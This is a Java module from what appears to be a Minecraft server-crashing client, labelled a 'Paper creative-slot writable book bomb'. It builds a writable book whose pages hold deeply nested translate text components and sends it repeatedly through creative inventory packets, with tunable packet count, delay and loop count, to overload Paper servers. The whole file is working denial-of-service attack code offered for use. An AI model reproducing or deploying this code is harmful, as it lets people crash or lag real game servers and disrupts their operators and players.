package me.dannycrasher.client.module.impl.paper;

import com.viaversion.viafabricplus.ViaFabricPlus;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.ScheduledExecutorService;
import me.dannycrasher.client.command.ArgumentType;
import me.dannycrasher.client.module.Module;
import me.dannycrasher.client.module.ModuleContext;
import me.dannycrasher.client.module.ModuleType;
import me.dannycrasher.client.protocol.components.data.DataComponents;
import me.dannycrasher.client.protocol.components.data.impl.DataWritableBookContent;
import me.dannycrasher.client.protocol.components.data.impl.Filterable;
import me.dannycrasher.client.protocol.components.objects.ItemStack;
import me.dannycrasher.client.protocol.components.objects.ItemType;

public class CreativeBook extends Module {
	private ScheduledExecutorService executorService;

	public CreativeBook() {
		super("CreativeBook", "Paper creative-slot writable book bomb (requires creative)", ModuleType.PAPER);
		addArgument("packets", ArgumentType.INT, 1, 100, "50");
		addArgument("chars", ArgumentType.INT, 1, 100, "80");
		addArgument("pages", ArgumentType.INT, 1, 15, "15");
		addArgument("slot", ArgumentType.INT, 0, 45, "36");
		addArgument("threadSleep", ArgumentType.INT, 1, 5000, "1000");
		addArgument("loopAmount", ArgumentType.INT, 1, 30, "10");
	}

	@Override
	public void executeModule(ModuleContext context) {
		int packets = context.getInt("packets");
		int chars = context.getInt("chars");
		int pages = context.getInt("pages");
		int slot = context.getInt("slot");
		int threadSleep = context.getInt("threadSleep");
		int loopAmount = context.getInt("loopAmount");

		int protocol = ViaFabricPlus.getImpl().getTargetVersion().getVersion();
		String pageContent = "{translate:chat.type.text,with:[{text:.}]}";
		for (int i = 0; i < chars; i++) {
			pageContent = pageContent.replace("text:.", "translate:chat.type.text,with:[{text:.}]");
		}

		List<Filterable<String>> pagesList = new ArrayList<>();
		for (int i = 0; i < pages; i++) {
			pagesList.add(new Filterable<>(pageContent, null));
		}

		DataComponents components = new DataComponents();
		components.put(new DataWritableBookContent(pagesList));
		ItemStack item = new ItemStack(ItemType.WRITABLE_BOOK.getId(protocol), 1, components);

		executorService = CreativeAttackHelper.start(this, context, executorService, packets, threadSleep, loopAmount, slot, item);
	}

	@Override
	public void onDisconnect() {
		super.onDisconnect();
		CreativeAttackHelper.shutdown(executorService);
	}
}
